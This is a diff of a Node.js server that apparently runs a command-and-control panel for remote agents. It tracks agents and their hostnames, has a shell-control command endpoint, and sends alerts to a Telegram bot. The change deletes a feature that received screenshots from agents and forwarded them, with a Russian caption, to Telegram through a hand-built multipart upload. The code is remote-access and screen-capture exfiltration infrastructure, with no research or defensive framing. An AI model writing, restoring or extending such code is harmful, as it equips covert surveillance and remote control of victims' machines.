@@ -3,7 +3,7 @@ const http = require('http');
 const socketIo = require('socket.io');
 const path = require('path');
 const fs = require('fs');
-const multer = require('multer');
+
 const https = require('https');
 
 const app = express();
@@ -18,8 +18,7 @@ if (fs.existsSync(CONFIG_PATH)) {
     config = JSON.parse(fs.readFileSync(CONFIG_PATH));
 }
 
-const SCREENSHOT_DIR = path.join(__dirname, 'public', 'screenshots');
-if (!fs.existsSync(SCREENSHOT_DIR)) fs.mkdirSync(SCREENSHOT_DIR, { recursive: true });
+
 
 // --- [ MIDDLEWARE ] ---
 app.set('view engine', 'ejs');
@@ -27,12 +26,7 @@ app.use(express.static('public'));
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Multer for screenshots
-const storage = multer.diskStorage({
-    destination: (req, file, cb) => cb(null, SCREENSHOT_DIR),
-    filename: (req, file, cb) => cb(null, `screen_${Date.now()}.png`)
-});
-const upload = multer({ storage });
+
 
 let lastAction = "No activity";
 let onlineAgents = new Map(); // Map<agentId, { lastSeen, hostname, queue: [] }>
@@ -41,33 +35,7 @@ let onlineAgents = new Map(); // Map<agentId, { lastSeen, hostname, queue: [] }>
 function sendToTelegram(text, photoPath = null) {
     if (!config.TG_BOT_TOKEN || config.TG_BOT_TOKEN.length < 10) return;
 
-    if (photoPath) {
-        // Send Photo
-        const boundary = '----Boundary';
-        const filename = path.basename(photoPath);
-        const options = {
-            hostname: 'api.telegram.org',
-            port: 443,
-            path: `/bot${config.TG_BOT_TOKEN}/sendPhoto`,
-            method: 'POST',
-            headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` }
-        };
-
-        const req = https.request(options, (res) => {
-            let body = '';
-            res.on('data', d => body += d);
-            res.on('end', () => {
-                if (res.statusCode !== 200) console.error(`[Telegram Error] Status: ${res.statusCode}, Body: ${body}`);
-            });
-        });
-        req.on('error', e => console.error(`[Telegram Request Error] ${e.message}`));
-        req.write(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${config.TG_CHAT_ID}\r\n`);
-        req.write(`--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="${filename}"\r\nContent-Type: image/png\r\n\r\n`);
-        req.write(fs.readFileSync(photoPath));
-        req.write(`\r\n--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${text}\r\n`);
-        req.write(`--${boundary}--\r\n`);
-        req.end();
-    } else {
+    {
         // Send Message
         const data = JSON.stringify({ chat_id: config.TG_CHAT_ID, text: text, parse_mode: "Markdown" });
         const options = {
@@ -95,7 +63,7 @@ app.get('/', (req, res) => {
     res.render('index', {
         lastAction,
         agentCount: onlineAgents.size,
-        screenshots: fs.readdirSync(SCREENSHOT_DIR).sort().reverse().slice(0, 10),
+
         config // Pass config to UI
     });
 });
@@ -154,13 +122,7 @@ app.post('/api/report', (req, res) => {
     res.send('ACK');
 });
 
-app.post('/api/screenshot', upload.single('screenshot'), (req, res) => {
-    const filename = req.file.filename;
-    const filePath = req.file.path;
-    io.emit('new_screenshot', { url: `/screenshots/${filename}`, time: new Date().toLocaleTimeString() });
-    sendToTelegram("📸 *Новый скриншот получен!*", filePath);
-    res.send('UPLOADED');
-});
+
 
 // Shell control
 app.post('/api/cmd', (req, res) => {
